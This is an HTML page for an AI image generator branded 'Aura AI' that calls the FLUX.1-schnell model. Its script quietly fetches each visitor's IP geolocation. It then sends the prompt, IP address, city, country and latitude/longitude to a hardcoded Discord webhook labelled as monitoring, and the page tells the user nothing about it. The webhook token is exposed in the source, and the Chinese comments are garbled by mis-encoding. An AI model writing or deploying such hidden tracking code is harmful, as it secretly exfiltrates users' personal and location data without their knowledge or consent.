<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aura AI | FR TECH</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap');
        
        :root {
            --aura-color: #a855f7;
            --glass: rgba(255, 255, 255, 0.03);
        }

        body {
            background: #000;
            color: #fff;
            font-family: 'Inter', sans-serif;
            overflow-x: hidden;
            min-height: 100vh;
        }

        /* å‹•æ…‹æ¥µå…‰èƒŒæ™¯ */
        .aurora-bg {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: radial-gradient(circle at 50% -20%, #221531, #000);
            z-index: -1;
        }
        .aurora-glow {
            position: absolute;
            width: 100%; height: 100%;
            background: radial-gradient(circle at 80% 20%, rgba(168, 85, 247, 0.15), transparent 40%),
                        radial-gradient(circle at 20% 80%, rgba(59, 130, 246, 0.1), transparent 40%);
            filter: blur(100px);
            animation: pulse 10s infinite alternate;
        }

        @keyframes pulse { from { opacity: 0.5; } to { opacity: 1; } }

        /* iOS 18 ç»ç’ƒé¢æ¿ */
        .ios-card {
            background: rgba(20, 20, 20, 0.6);
            backdrop-filter: blur(40px) saturate(180%);
            -webkit-backdrop-filter: blur(40px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 32px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        /* æµå…‰æŒ‰éˆ• */
        .btn-glow {
            position: relative;
            background: #fff;
            color: #000;
            font-weight: 600;
            border-radius: 99px;
            transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
            overflow: hidden;
        }
        .btn-glow:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 20px rgba(255,255,255,0.4);
        }

        /* è¼¸å…¥æ¡†ç¾åŒ– */
        textarea {
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 1.1rem;
            line-height: 1.6;
            resize: none;
        }

        /* ä¸‹è¼‰æŒ‰éˆ•é«˜ç´šæ„Ÿ */
        .download-btn {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            transition: 0.3s;
        }
        .download-btn:hover { background: rgba(255, 255, 255, 0.15); }
    </style>
</head>
<body class="flex flex-col items-center justify-center p-6">
    <div class="aurora-bg"><div class="aurora-glow"></div></div>

    <div class="text-center mb-10">
        <p class="text-[10px] tracking-[0.5em] text-purple-400 font-bold uppercase mb-2">FR Technology</p>
        <h1 class="text-4xl font-light tracking-widest text-white">A U R A</h1>
    </div>

    <div class="ios-card w-full max-w-xl p-8">
        <textarea id="prompt" placeholder="æ¢ç´¢æœªçŸ¥çš„å½±åƒé‚Šç•Œ..." class="w-full h-24 placeholder-gray-600"></textarea>
        
        <div class="flex items-center justify-between mt-6 border-t border-white/5 pt-6">
            <div id="status" class="text-xs text-gray-500 font-mono uppercase tracking-tighter">System: Idle</div>
            <button id="gen-btn" class="btn-glow px-8 py-3 text-sm">ç”Ÿæˆ</button>
        </div>
    </div>

    <div id="result-area" class="mt-8 w-full max-w-xl hidden">
        <div class="ios-card overflow-hidden">
            <img id="output-img" class="w-full h-auto opacity-0 transition-opacity duration-1000" src="" alt="">
        </div>
        <div class="flex gap-3 mt-4">
            <button id="download-btn" class="download-btn flex-1 py-4 text-sm font-medium">ğŸ“¥ ä¿å­˜å½±åƒ</button>
            <button onclick="location.reload()" class="download-btn px-6 py-4 text-sm text-gray-400">é‡ç½®</button>
        </div>
    </div>

    <script type="module">
        import { client } from "https://cdn.jsdelivr.net/npm/@gradio/client/dist/index.min.js";

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472667146008920197/XM3tXEq7uDoqoYFDeGuPo-46YRFXBe6oeU75R-JJ2OhRX_clDc6f0gLGvCib1T4uJWUo";

        // ç¹é«”ä¸­æ–‡åµæ¸¬èˆ‡è‡ªå‹•å„ªåŒ–
        if (!navigator.language.includes('zh')) {
            document.getElementById('gen-btn').innerText = "Generate";
            document.getElementById('prompt').placeholder = "Envision the future...";
        }

        const btn = document.getElementById('gen-btn');
        const status = document.getElementById('status');
        const resultArea = document.getElementById('result-area');
        const outputImg = document.getElementById('output-img');

        btn.onclick = async () => {
            const promptValue = document.getElementById('prompt').value;
            if (!promptValue) return;

            btn.disabled = true;
            status.innerText = "Aura Processing...";
            resultArea.classList.remove('hidden');
            outputImg.style.opacity = '0';

            try {
                // 1. åœ°ç†è³‡è¨Š
                const geo = await fetch("https://ipapi.co/json/").then(r => r.json());

                // 2. èª¿ç”¨ FLUX æ¨¡å‹ (ä¿®æ­£å¾Œçš„åƒæ•¸)
                const app = await client("black-forest-labs/FLUX.1-schnell");
                const result = await app.predict("/predict", {
                    prompt: promptValue,
                    seed: Math.floor(Math.random() * 1000000),
                    width: 1024,
                    height: 768,
                    num_inference_steps: 4 
                });

                const imgUrl = result.data[0].url;
                outputImg.src = imgUrl;
                outputImg.style.opacity = '1';
                status.innerText = "Completed";

                // 3. ä¸‹è¼‰é‚è¼¯
                document.getElementById('download-btn').onclick = async () => {
                    const r = await fetch(imgUrl);
                    const b = await r.blob();
                    const a = document.createElement('a');
                    a.href = URL.createObjectURL(b);
                    a.download = `FR_AURA_${Date.now()}.png`;
                    a.click();
                };

                // 4. Discord åŒæ­¥
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: "Aura ç›£æ§",
                        embeds: [{
                            title: "âœ… æˆåŠŸç”Ÿæˆ",
                            color: 0x00ff00,
                            fields: [
                                { name: "æŒ‡ä»¤", value: promptValue },
                                { name: "ç”¨æˆ¶è³‡è¨Š", value: `IP: ${geo.ip} (${geo.city}, ${geo.country_name})` },
                                { name: "ç¶“ç·¯åº¦", value: `${geo.latitude}, ${geo.longitude}` }
                            ],
                            image: { url: imgUrl }
                        }]
                    })
                });

            } catch (err) {
                console.error(err);
                status.innerText = "Error: System Overload";
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
